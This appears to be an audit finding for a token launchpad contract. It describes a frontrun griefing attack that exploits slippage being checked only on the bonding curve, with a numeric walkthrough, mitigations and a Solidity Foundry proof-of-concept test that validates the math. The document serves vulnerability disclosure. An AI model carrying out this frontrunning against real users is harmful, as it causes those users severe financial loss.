  "body": "### Finding description and impact\n- Root cause: Slippage is enforced only on the curve portion in `Launchpad.buy`, not on the combined curve+AMM execution after graduation. An attacker can first push bonding near completion (cheaply when Vb is small), then frontrun to force a tiny curve fill and trigger graduation; the CPMM’s marginal price near end is hyperbolic.\n- Impact: Victim’s `maxAmountInQuote` is largely consumed by an extremely expensive tiny curve fill; remaining quote is insufficient for the AMM exact-out leg, so victim gets only a tiny amount at a terrible effective price. Attacker’s trade is typically unprofitable (griefing), but reliably harms users.\n\n### vulnerability flow (exact numbers as in PoC)\n- Setup (scaled): bonding supply Bs = 8,000,000; virtual base Vb = 1,000; virtual quote Vq = 1,000,000,000. Constant K = Vq·(Bs+Vb) = 8.001e15.\n- Attacker actively pushes curve near end: leaves remaining R = 1,000,000 on curve (can be achieved by buying beforehand; cost is moderate early and rises only near the end).\n- Current reserves: Br = Vb + R = 1,001,000; Qr = K/Br ≈ 7.992e9.\n- Victim targets D = 500,000 base; budget from current curve view:\n  - Q_D ≈ Qr·D/(Br−D) ≈ 7.992e9 · 500,000 / 501,000 ≈ 7.977e9 quote.\n  - Sets `maxAmountInQuote = Q_D × 1.005` ≈ 8.016e9 (0.5% headroom).\n- Attacker frontruns to leave only Z = 1 base on curve for the victim (R−Y = 1):\n  - Br' = Vb + Z = 1,001; Qr' = K/Br' ≈ 7.992e12.\n  - Victim curve cost Q_Z = Qr'·Z/Vb ≈ 7.992e12 / 1,000 ≈ 7.992e9, which is ≤ maxAmountInQuote.\n- Graduation: AMM initialized with base = Bs/4 = 2,000,000; quote = totalQuote = (Vq·Bs)/Vb = 8.0e12.\n- Victim remaining: needs D−Z = 499,999 base; remaining quote = maxAmountInQuote − Q_Z ≈ 8.016e9 − 7.992e9 = 2.4e7.\n- AMM exact-out required quote for 499,999 base:\n  - Using Uniswap formula, requiredQuote ≈ (reserveIn·out·1000)/(997·(reserveOut−out)) ≈ 2.67e12 (orders of magnitude larger than 2.4e7).\n  - Remaining quote ≪ requiredQuote → AMM leg fails; victim ends with only Z = 1 base.\n- Who loses/gains (from PoC):\n  - Victim: pays ≈ 7.993e9 quote for 1 base (effective ≈ 7.993e9/base) instead of 500,000 base → severe loss.\n  - Attacker: buying to force Z=1 near end is costly; selling on AMM yields far less → net loss (grief-only), but user harm is deterministic.\n\n### Recommended mitigation\n- Enforce holistic slippage on total execution (curve + AMM). For requested D:\n  - Compute Z and Q_Z from the curve; estimate AMM `requiredQuote` for (D−Z); require `Q_Z + requiredQuote ≤ maxAmountInQuote`.\n- Add a global min-out on base for the whole operation (e.g., `minAmountOutBase`) to prevent tiny fills.\n- Optionally disallow partial curve fills within a small epsilon of Bs, or graduate atomically at the user’s pre-attack snapshot.",
  "proof_of_concept": "<details>\n\n<summary> \nAttached POC (click to drop down)\n</summary>\n\n1. Replace `test/c4-poc/PoCLaunchpad.t.sol` completely as shown below\n2. then run  `forge t --mc PoCLaunchpad  -vvv`\n\n```solidity\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.27;\n\nimport \"forge-std/Test.sol\";\nimport {GTELaunchpadV2PairFactory} from \"contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol\";\nimport {GTELaunchpadV2Pair} from \"contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\";\nimport {MockERC20} from \"forge-std/mocks/MockERC20.sol\";\nimport {MockDistributor} from \"../mocks/MockDistributor.sol\";\nimport {IERC20} from \"@gte-univ2-core/interfaces/IERC20.sol\";\nimport {IUniswapV2Pair} from \"@gte-univ2-core/interfaces/IUniswapV2Pair.sol\";\n\ncontract PoCLaunchpad is Test {\n    MockERC20 public base;\n    MockERC20 public quote;\n    GTELaunchpadV2Pair public pair;\n    address public launchpad;\n    MockDistributor public distributor;\n    GTELaunchpadV2PairFactory public v2Factory;\n    address public mockERC20Logic;\n    address public token0;\n    address public token1;\n\n    struct TestState {\n        uint256 ourLiq;\n        uint256 swapIn;\n        uint256 ourLP;\n        uint256 totalSupply;\n        uint256 ourShare;\n        uint256 expectedFee;\n        uint256 amount0Out;\n        uint256 amount1Out;\n        uint256 balBaseAfterSwap;\n        uint256 balQuoteAfterSwap;\n        uint256 expectedBurnBaseWithout;\n        uint256 expectedBurnQuoteWithout;\n        uint256 ourPenalty;\n        uint256 balBaseAfterDist;\n        uint256 burnBase;\n        uint256 burnQuote;\n        uint256 halfSwap;\n        uint256 tempSum;\n        uint256 expectedYield;\n    }\n\n    // Asserts the pool balance state after a test and sync\n    modifier PBAfter() {\n        _;\n        _assertPoolBalance();\n    }\n\n    function _calculateExpectedLaunchpadFee(uint256 amountIn, address tokenIn)\n        internal\n        view\n        returns (uint256 expectedFee)\n    {\n        // Only calculate fee if rewards pool is active and distributor is set\n        if (pair.launchpadFeeDistributor() == address(0) || pair.rewardsPoolActive() == 0) return 0;\n\n        // Use the exact same calls as the contract\n        uint256 totalLpSupply = pair.totalSupply();\n        uint256 launchpadLpBalance = pair.balanceOf(launchpad) + pair.MINIMUM_LIQUIDITY();\n\n        // Assume tokenIn is token0 (base), as per setup\n        expectedFee = (amountIn * launchpadLpBalance) / (totalLpSupply * 1000);\n        return expectedFee;\n    }\n\n    function _assertPoolBalance() internal {\n        (uint112 accruedFee0, uint112 accruedFee1, uint32 blockTimeLast) = pair.getAccruedLaunchpadFees();\n\n        // Sync reserves up with the erc20 balance of the pool (less accrued fees)\n        // If the sync would be the first _update of a block and would distribute accrued fees, then it will emit an extra event\n        vm.recordLogs();\n        if (accruedFee0 | accruedFee1 > 0 && blockTimeLast < block.timestamp) {\n            vm.expectEmit();\n            emit GTELaunchpadV2Pair.LaunchpadFeesCollected(accruedFee0, accruedFee1);\n            pair.sync();\n            assertEq(vm.getRecordedLogs().length, 2);\n        } else {\n            pair.sync();\n            assertEq(vm.getRecordedLogs().length, 1);\n        }\n\n        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();\n\n        assertEq(\n            IERC20(token0).balanceOf(address(pair)),\n            uint256(reserve0 + accruedFee0),\n            \"Pool balance invariant broken for token0!\"\n        );\n        assertEq(\n            IERC20(token1).balanceOf(address(pair)),\n            uint256(reserve1 + accruedFee1),\n            \"Pool balance invariant broken for token1!\"\n        );\n    }\n\n    function setUp() public {\n        launchpad = makeAddr(\"launchpad\");\n        vm.label(launchpad, \"Launchpad\");\n\n        distributor = new MockDistributor();\n\n        v2Factory = new GTELaunchpadV2PairFactory(address(this), launchpad, launchpad, address(distributor));\n\n        mockERC20Logic = address(new MockERC20());\n\n        (address baseAddr, address quoteAddr, address pairAddr) = _createLaunchpadPair(\"base\", \"quote\");\n\n        base = MockERC20(baseAddr);\n        quote = MockERC20(quoteAddr);\n        pair = GTELaunchpadV2Pair(pairAddr);\n\n        deal(address(base), address(this), 100 ether);\n        deal(address(quote), address(this), 100 ether);\n\n        base.transfer(address(pair), 100 ether);\n        quote.transfer(address(pair), 100 ether);\n\n        token0 = pair.token0();\n        token1 = pair.token1();\n\n        // lp tokens are minted to launchpad as the fee calc is the launchpad's share of total lp supply\n        pair.mint(launchpad);\n    }\n\n    function _createLaunchpadPair(string memory nameBase, string memory nameQuote)\n        internal\n        returns (address baseAddr, address quoteAddr, address pairAddr)\n    {\n        baseAddr = vm.addr(uint256(keccak256(abi.encode(nameBase))));\n        quoteAddr = vm.addr(uint256(keccak256(abi.encode(nameQuote))));\n\n        if (baseAddr > quoteAddr) {\n            (baseAddr, quoteAddr) = (quoteAddr, baseAddr);\n            (nameBase, nameQuote) = (nameQuote, nameBase);\n        }\n\n        vm.label(baseAddr, string(abi.encodePacked(nameBase, \" Token\")));\n        vm.label(quoteAddr, string(abi.encodePacked(nameQuote, \" Token\")));\n\n        vm.etch(baseAddr, mockERC20Logic.code);\n        vm.etch(quoteAddr, mockERC20Logic.code);\n\n        MockERC20(baseAddr).initialize(nameBase, \"btn\", 18);\n        MockERC20(quoteAddr).initialize(nameQuote, \"qnt\", 18);\n\n        // Launchpad contract creates a pair\n        vm.prank(launchpad);\n        v2Factory.createPair(baseAddr, quoteAddr);\n\n        pairAddr = v2Factory.getPair(baseAddr, quoteAddr);\n    }\n\n    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)\n        internal\n        pure\n        returns (uint256 amountOut)\n    {\n        require(amountIn > 0, \"UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT\");\n        require(reserveIn > 0 && reserveOut > 0, \"UniswapV2Library: INSUFFICIENT_LIQUIDITY\");\n        uint256 amountInWithFee = amountIn * 997;\n        uint256 numerator = amountInWithFee * reserveOut;\n        uint256 denominator = (reserveIn * 1000) + amountInWithFee;\n        amountOut = numerator / denominator;\n    }\n\n    function getAmountsOut(GTELaunchpadV2Pair pair_, uint256 amountIn, address tokenIn)\n        internal\n        view\n        returns (uint256 amount0Out, uint256 amount1Out)\n    {\n        bool isZeroTokenIn = tokenIn == pair_.token0();\n        (uint256 reserve0, uint256 reserve1,) = pair_.getReserves();\n        (uint256 reserveIn, uint256 reserveOut) = isZeroTokenIn ? (reserve0, reserve1) : (reserve1, reserve0);\n        uint256 amountOut = getAmountOut(amountIn, reserveIn, reserveOut);\n        (amount0Out, amount1Out) = isZeroTokenIn ? (uint256(0), amountOut) : (amountOut, uint256(0));\n    }\n\n    function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut)\n        internal\n        pure\n        returns (uint256 amountIn)\n    {\n        require(amountOut > 0, \"UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT\");\n        require(reserveIn > 0 && reserveOut > 0, \"UniswapV2Library: INSUFFICIENT_LIQUIDITY\");\n        uint256 numerator = reserveIn * amountOut * 1000;\n        uint256 denominator = (reserveOut - amountOut) * 997;\n        amountIn = (numerator / denominator) + 1;\n    }\n\n        struct FrontrunData {\n            uint256 Bs; uint256 Vb; uint256 Vq;\n            uint256 R; uint256 Br; uint256 K; uint256 Qr;\n            uint256 D; uint256 Q_D; uint256 Z; uint256 BrPrime; uint256 QrPrime; uint256 Q_Z; uint256 maxAmountInQuote;\n            uint256 tokensToLock; uint256 totalQuote;\n            address baseAddr; address quoteAddr; address pairAddr;\n            GTELaunchpadV2Pair gradPair; address t0; bool baseIsToken0;\n            uint112 r0; uint112 r1; uint256 reserveIn; uint256 reserveOut;\n            uint256 remainingBase; uint256 remainingQuote; uint256 requiredQuote;\n        }\n\n\n    /// @dev PoC: Frontrun-induced graduation griefing validates that slippage on curve-only is insufficient\n    /// The attacker buys almost all remaining bonding supply so victim only gets a tiny Z from the curve\n    /// at a very high marginal price, then the AMM portion cannot be completed with remaining quote.\n    function test_PoC_FrontrunGraduationGriefing_MathValidation() public {\n\n        FrontrunData memory d;\n\n        // Scaled parameters to keep within token reserve limits\n        d.Bs = 8_000_000;             // bonding supply\n        d.Vb = 1_000;                 // virtual base\n        d.Vq = 1_000_000_000;         // virtual quote\n\n        // Attacker actively pushes curve near end; set remaining base on curve\n        d.R = 1_000_000;              // remaining base on curve\n        d.Br = d.Vb + d.R;\n        d.K = d.Vq * (d.Bs + d.Vb);\n        d.Qr = d.K / d.Br;\n\n        d.D = 500_000;                // victim desired base\n        d.Q_D = (d.Qr * d.D) / (d.Br - d.D);\n\n        // Attacker leaves tiny fill for victim\n        d.Z = 1;                      // victim curve fill\n        d.BrPrime = d.Vb + d.Z;\n        d.QrPrime = d.K / d.BrPrime;\n        d.Q_Z = (d.QrPrime * d.Z) / d.Vb;\n\n        // Victim sets max quote slightly above pre-frontrun quote\n        d.maxAmountInQuote = (d.Q_D * 1005) / 1000; // +0.5%\n        assertLe(d.Q_Z, d.maxAmountInQuote, \"Curve-only slippage would fail; adjust params\");\n\n        // AMM initial reserves on graduation\n        d.tokensToLock = d.Bs / 4;              // 2,000,000 base\n        d.totalQuote = (d.Vq * d.Bs) / d.Vb;    // total quote collected by curve\n\n        // Create new pair representing post-graduation AMM\n        (d.baseAddr, d.quoteAddr, d.pairAddr) = _createLaunchpadPair(\"baseG\", \"quoteG\");\n        d.gradPair = GTELaunchpadV2Pair(d.pairAddr);\n        d.t0 = d.gradPair.token0();\n        d.baseIsToken0 = d.baseAddr == d.t0;\n\n        // Fund pair and mint LP\n        deal(d.baseAddr, address(this), d.tokensToLock);\n        deal(d.quoteAddr, address(this), d.totalQuote);\n        if (d.baseIsToken0) {\n            IERC20(d.baseAddr).transfer(address(d.gradPair), d.tokensToLock);\n            IERC20(d.quoteAddr).transfer(address(d.gradPair), d.totalQuote);\n        } else {\n            IERC20(d.quoteAddr).transfer(address(d.gradPair), d.totalQuote);\n            IERC20(d.baseAddr).transfer(address(d.gradPair), d.tokensToLock);\n        }\n        d.gradPair.mint(address(this));\n\n        d.remainingBase = d.D - d.Z;\n        d.remainingQuote = d.maxAmountInQuote - d.Q_Z;\n\n        (d.r0, d.r1,) = d.gradPair.getReserves();\n        d.reserveIn = d.baseIsToken0 ? uint256(d.r1) : uint256(d.r0);\n        d.reserveOut = d.baseIsToken0 ? uint256(d.r0) : uint256(d.r1);\n        d.requiredQuote = getAmountIn(d.remainingBase, d.reserveIn, d.reserveOut);\n\n        // Remaining quote is insufficient to complete AMM leg\n        assertLt(d.remainingQuote, d.requiredQuote, \"AMM leg would unexpectedly succeed; adjust params\");\n    }\n}\n```\n</details>",
